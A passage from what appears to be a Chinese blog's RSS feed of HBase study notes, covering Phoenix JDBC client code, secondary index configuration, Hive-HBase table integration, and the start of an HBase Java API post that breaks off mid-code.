class="token punctuation">.</span>client<span class="token punctuation">.</span>ThinClientUtil<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PhoenixTest</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> SQLException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        String connectionUrl <span class="token operator">=</span> ThinClientUtil<span class="token punctuation">.</span><span class="token function">getConnectionUrl</span><span class="token punctuation">(</span><span class="token string">"hadoop102"</span><span class="token punctuation">,</span> <span class="token number">8765</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Connection connection <span class="token operator">=</span> DriverManager<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>connectionUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>        PreparedStatement preparedStatement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span><span class="token string">"select * from student"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResultSet resultSet <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\t"</span> <span class="token operator">+</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//关闭</span>        connection<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-3-2-Thick-Client"><a href="#1-2-3-2-Thick-Client" class="headerlink" title="1.2.3.2 Thick Client"></a>1.2.3.2 Thick Client</h4><p>1）在pom中加入依赖</p><pre class="line-numbers language-xml"><code class="language-xml"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.phoenix<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>phoenix-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.0.0-HBase-2.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusions</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>exclusion</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.glassfish<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>javax.el<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusion</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>exclusions</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.glassfish<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>javax.el<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.0.1-b06<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）编写代码</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>phoenix<span class="token punctuation">.</span>thin<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestThick</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> SQLException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        String url <span class="token operator">=</span> <span class="token string">"jdbc:phoenix:hadoop102,hadoop103,hadoop104:2181"</span><span class="token punctuation">;</span>        Properties props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"phoenix.schema.isNamespaceMappingEnabled"</span><span class="token punctuation">,</span><span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Connection connection <span class="token operator">=</span> DriverManager<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>        PreparedStatement ps <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span><span class="token string">"select * from \"test\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ResultSet rs <span class="token operator">=</span> ps<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>rs<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>rs<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">":"</span> <span class="token operator">+</span>rs<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="1-3-Phoenix二级索引"><a href="#1-3-Phoenix二级索引" class="headerlink" title="1.3 Phoenix二级索引"></a>1.3 Phoenix二级索引</h2><h3 id="1-3-1-二级索引配置文件"><a href="#1-3-1-二级索引配置文件" class="headerlink" title="1.3.1 二级索引配置文件"></a>1.3.1 二级索引配置文件</h3><p>1.添加如下配置到HBase的HRegionserver节点的hbase-site.xml</p><pre class="line-numbers language-xml"><code class="language-xml">  <span class="token comment" spellcheck="true">&lt;!-- phoenix regionserver 配置参数--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hbase.regionserver.wal.codec<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>org.apache.hadoop.hbase.regionserver.wal.IndexedWALEditCodec<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hbase.region.server.rpc.scheduler.factory.class<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>org.apache.hadoop.hbase.ipc.PhoenixRpcSchedulerFactory<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>Factory to create the Phoenix RPC Scheduler that uses separate queues for index and metadata updates<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hbase.rpc.controllerfactory.class<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>org.apache.hadoop.hbase.ipc.controller.ServerRpcControllerFactory<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span>Factory to create the Phoenix RPC Scheduler that uses separate queues for index and metadata updates<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-3-2-全局二级索引"><a href="#1-3-2-全局二级索引" class="headerlink" title="1.3.2 全局二级索引"></a>1.3.2 全局二级索引</h3><p>Global Index是默认的索引格式，创建全局索引时，会在HBase中建立一张新表。也就是说索引数据和数据表是存放在不同的表中的，因此全局索引适用于多读少写的业务场景。</p><p>写数据的时候会消耗大量开销，因为索引表也要更新，而索引表是分布在不同的数据节点上的，跨节点的数据传输带来了较大的性能消耗。</p><p>在读数据的时候Phoenix会选择索引表来降低查询消耗的时间。</p><ol><li>创建单个字段的全局索引</li></ol><pre class="line-numbers language-bash"><code class="language-bash">CREATE INDEX my_index ON my_table <span class="token punctuation">(</span>my_col<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="/2020/11/25/bigdata-HBase4-phoenix/1637837037624.png" alt="1637837037624"></p><p>如果想查询的字段不是索引字段的话索引表不会被使用，也就是说不会带来查询速度的提升。</p><p>  <img src="/2020/11/25/bigdata-HBase4-phoenix/1637837064704.png"></p><p>2）创建携带其他字段的全局索引</p><pre class="line-numbers language-bash"><code class="language-bash">CREATE INDEX my_index ON my_table <span class="token punctuation">(</span>v1<span class="token punctuation">)</span> INCLUDE <span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="/2020/11/25/bigdata-HBase4-phoenix/1637837124230.png" alt="1637837124230"></p><h3 id="1-3-3-本地二级索引"><a href="#1-3-3-本地二级索引" class="headerlink" title="1.3.3 本地二级索引"></a>1.3.3 本地二级索引</h3><p>Local Index适用于写操作频繁的场景。</p><p>索引数据和数据表的数据是存放在同一张表中（且是同一个Region），避免了在写操作的时候往不同服务器的索引表中写索引带来的额外开销。</p><pre class="line-numbers language-bash"><code class="language-bash">CREATE LOCAL INDEX my_index ON my_table <span class="token punctuation">(</span>my_column<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="/2020/11/25/bigdata-HBase4-phoenix/1637837158438.png" alt="1637837158438"></p><h1 id="2-与Hive的集成"><a href="#2-与Hive的集成" class="headerlink" title="2 与Hive的集成"></a>2 与Hive的集成</h1><h2 id="2-1-HBase与Hive的对比"><a href="#2-1-HBase与Hive的对比" class="headerlink" title="2.1 HBase与Hive的对比"></a>2.1 HBase与Hive的对比</h2><h3 id="2-1-1-Hive"><a href="#2-1-1-Hive" class="headerlink" title="2.1.1 Hive"></a>2.1.1 Hive</h3><p>(1) 数据分析工具</p><p>Hive的本质其实就相当于将HDFS中已经存储的文件在Mysql中做了一个双射关系，以方便使用HQL去管理查询。</p><p>(2) 用于数据分析、清洗</p><p>Hive适用于离线的数据分析和清洗，延迟较高。</p><p>(3) 基于HDFS、MapReduce</p><p>Hive存储的数据依旧在DataNode上，编写的HQL语句终将是转换为MapReduce代码执行。</p><h3 id="2-1-2-HBase"><a href="#2-1-2-HBase" class="headerlink" title="2.1.2 HBase"></a>2.1.2 HBase</h3><p>(1) 数据库</p><p>是一种面向列族存储的非关系型数据库。</p><p>(2) 用于存储结构化和非结构化的数据</p><p>适用于单表非关系型数据的存储，不适合做关联查询，类似JOIN等操作。</p><p>(3) 基于HDFS</p><p>数据持久化存储的体现形式是HFile，存放于DataNode中，被ResionServer以region的形式进行管理。</p><p>(4) 延迟较低，接入在线业务使用</p><p>面对大量的企业数据，HBase可以直线单表大量数据的存储，同时提供了高效的数据访问速度。</p><h2 id="2-2-HBase与Hive集成使用"><a href="#2-2-HBase与Hive集成使用" class="headerlink" title="2.2 HBase与Hive集成使用"></a>2.2 HBase与Hive集成使用</h2><p>在hive-site.xml中添加zookeeper的属性，如下：</p><pre class="line-numbers language-xml"><code class="language-xml">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hive.zookeeper.quorum<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>hadoop102,hadoop103,hadoop104<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>hive.zookeeper.client.port<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>2181<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>案例一</p><p>目标：建立Hive表，关联HBase表，插入数据到Hive表的同时能够影响HBase表。</p><p>分步实现：</p><p>1.在Hive中创建表同时关联HBase</p><pre class="line-numbers language-bash"><code class="language-bash">CREATE TABLE hive_hbase_emp_table<span class="token punctuation">(</span>empno int,ename string,job string,mgr int,hiredate string,sal double,<span class="token function">comm</span> double,deptno int<span class="token punctuation">)</span>STORED BY <span class="token string">'org.apache.hadoop.hive.hbase.HBaseStorageHandler'</span>WITH SERDEPROPERTIES <span class="token punctuation">(</span><span class="token string">"hbase.columns.mapping"</span> <span class="token operator">=</span> <span class="token string">":key,info:ename,info:job,info:mgr,info:hiredate,info:sal,info:comm,info:deptno"</span><span class="token punctuation">)</span>TBLPROPERTIES <span class="token punctuation">(</span><span class="token string">"hbase.table.name"</span> <span class="token operator">=</span> <span class="token string">"hbase_emp_table"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提示：完成之后，可以分别进入Hive和HBase查看，都生成了对应的表</p><p>2.在Hive中创建临时中间表，用于load文件中的数据</p><p>提示：不能将数据直接load进Hive所关联HBase的那张表中</p><pre class="line-numbers language-bash"><code class="language-bash">CREATE TABLE emp<span class="token punctuation">(</span>empno int,ename string,job string,mgr int,hiredate string,sal double,<span class="token function">comm</span> double,deptno int<span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3.向Hive中间表中load数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> load data local inpath <span class="token string">'/home/admin/softwares/data/emp.txt'</span> into table emp<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4.通过insert命令将中间表中的数据导入到Hive关联Hbase的那张表中</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> insert into table hive_hbase_emp_table <span class="token keyword">select</span> * from emp<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5.查看Hive以及关联的HBase表中是否已经成功的同步插入了数据<br>Hive：</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> <span class="token keyword">select</span> * from hive_hbase_emp_table<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>HBase：</p><pre class="line-numbers language-bash"><code class="language-bash">Hbase<span class="token operator">></span> scan <span class="token string">'hbase_emp_table'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>案例二</p><p>目标：在HBase中已经存储了某一张表hbase_emp_table，然后在Hive中创建一个外部表来关联HBase中的hbase_emp_table这张表，使之可以借助Hive来分析HBase这张表中的数据。</p><p>注：该案例2紧跟案例1的脚步，所以完成此案例前，请先完成案例1。</p><p>分步实现：</p><p>1.在Hive中创建外部表</p><pre class="line-numbers language-bash"><code class="language-bash">CREATE EXTERNAL TABLE relevance_hbase_emp<span class="token punctuation">(</span>empno int,ename string,job string,mgr int,hiredate string,sal double,<span class="token function">comm</span> double,deptno int<span class="token punctuation">)</span>STORED BY <span class="token string">'org.apache.hadoop.hive.hbase.HBaseStorageHandler'</span>WITH SERDEPROPERTIES <span class="token punctuation">(</span><span class="token string">"hbase.columns.mapping"</span> <span class="token operator">=</span> <span class="token string">":key,info:ename,info:job,info:mgr,info:hiredate,info:sal,info:comm,info:deptno"</span><span class="token punctuation">)</span> TBLPROPERTIES <span class="token punctuation">(</span><span class="token string">"hbase.table.name"</span> <span class="token operator">=</span> <span class="token string">"hbase_emp_table"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.关联后就可以使用Hive函数进行一些分析操作了</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from relevance_hbase_emp<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/HBase/">HBase</category>
      
      
      <comments>https://m01ly.github.io/2020/11/25/bigdata-HBase4-phoenix/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>HBase学习笔记（三） HBase的API使用</title>
      <link>https://m01ly.github.io/2020/11/25/bigdata-HBase3-API/</link>
      <guid>https://m01ly.github.io/2020/11/25/bigdata-HBase3-API/</guid>
      <pubDate>Wed, 25 Nov 2020 03:22:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1 环境准备"></a>1 环境准备</h2><p>新建项目后在pom.xml中添加依赖</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.hbase<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>hbase-server<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.0.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.hbase<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>hbase-client<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.0.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>API官方手册：</p><p><a href="https://hbase.apache.org/2.2/apidocs/index.html">https://hbase.apache.org/2.2/apidocs/index.html</a></p><h2 id="2-DDL"><a href="#2-DDL" class="headerlink" title="2 DDL"></a>2 DDL</h2><p>创建HBase_DDL类</p><h3 id="2-1-判断表是否存在和创建命名空间"><a href="#2-1-判断表是否存在和创建命名空间" class="headerlink" title="2.1 判断表是否存在和创建命名空间"></a>2.1 判断表是否存在和创建命名空间</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>conf<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>HBaseConfiguration<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>NamespaceDescriptor<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>NamespaceExistException<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>TableName<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>client<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>hadoop<span class="token punctuation">.</span>hbase<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Bytes<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HBase_DDL</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//TODO 判断表是否存在</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isTableExist</span><span class="token punctuation">(</span>String tableName<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//1.创建配置信息并配置</span>        Configuration configuration <span class="token operator">=</span> HBaseConfiguration<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        configuration<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"hbase.zookeeper.quorum"</span><span class="token punctuation">,</span> <span class="token string">"hadoop102,hadoop103,hadoop104"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//2.获取与HBase的连接</span>        Connection connection <span class="token operator">=</span> ConnectionFactory<span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span>configuration<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//3.获取DDL操作对象</span>        Admin admin <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">getAdmin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//4.1判断表是否存在操作</span>        <span class="token keyword">boolean</span> exists <span class="token operator">=</span> admin<span class="token punctuation">.</span><span class="token function">tableExists</span><span class="token punctuation">(</span>TableName<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>tableName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//4.2 创建命名空间</span>         <span class="token comment" spellcheck="true">//42.1创建命名空间描述器</span>        NamespaceDescriptor namespaceDescriptor <span class="token operator">=</span> 